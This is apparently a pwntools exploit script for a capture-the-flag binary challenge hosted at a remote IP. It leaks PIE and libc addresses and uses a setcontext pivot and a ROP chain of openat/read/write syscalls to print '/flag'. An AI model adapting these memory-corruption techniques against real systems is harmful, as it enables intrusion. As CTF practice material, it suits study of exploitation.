#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.41.207.206 --port 17013 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.41.207.206'
port = int(args.PORT or 17013)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x5555555555be
# b *0x555555555602
# b *0x555555555638
# b *0x555555555494
b *0x0000555555555670
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


libc = exe.libc
print list(libc.search(asm("syscall ; ret")))
main = 0x148c
start = 0x11a0
buffer = 0x4060

p ='a'
io.sendafter(": ",p)

if args.LOCAL:
    p = '31'
else:
    p = '31'
io.sendlineafter(": ",p)
io.recvuntil(": ")
base_exe = int(io.recvline()[:-1])-main #0x1680
print hex(base_exe)

p = '27'
io.sendlineafter(": ",p)
io.recvuntil(": ")

libc.address = int(io.recvline()[:-1]) - libc.sym['__libc_start_main'] - 234-9
print hex(libc.address)

p = '27'
io.sendlineafter(": ",p)
p = str(base_exe + start)
io.sendlineafter(" = ",p)

# num
p = str(0xdeadbeef)
io.sendlineafter(": ",p)

# to_setcontext = libc.sym['setcontext']+53
to_setcontext = libc.address + 0x580a0 + 61
print hex(to_setcontext)

print list(libc.search(asm("pop rdx ; ret")))


pop_rdi = libc.address + 0x0000000000026b72
pop_rsi = libc.address + 0x0000000000027529
pop_rdx = libc.address + 0x000000000011c371
# pop_rdx = libc.address + 20870
pop_rax = libc.address + 0x000000000004a550
syscall_ret = libc.address+ 0x1231c9
print hex(syscall_ret)

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi) 
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx)+ p64(0)
    chain += p64(syscall_ret)
    return chain

buffer = base_exe+0x4060

# ke dua
size=0x100
to_buffer = buffer+256
p =p64(buffer+8)
p += p64(pop_rax)
# p += syscall(2, to_buffer, 0, 0)
p += syscall(257, 0xffffffffffffff9c, to_buffer, 0)
p += syscall(0, 3, to_buffer+size, size)
p += syscall(1, 1, to_buffer+size, size)
print len(p)
p += '/flag'.ljust(64,"\x00")
io.sendafter(": ",p)

p = '0'
io.sendlineafter(": ",p)
io.recvuntil(": ")

p = '0'
io.sendlineafter(": ",p)
io.recvuntil(": ")

p = '27'
io.sendlineafter(": ",p)
p = str(to_setcontext)
io.sendlineafter(" = ",p)

# num
p = str(buffer-0xa0)
io.sendlineafter(": ",p)



io.interactive()

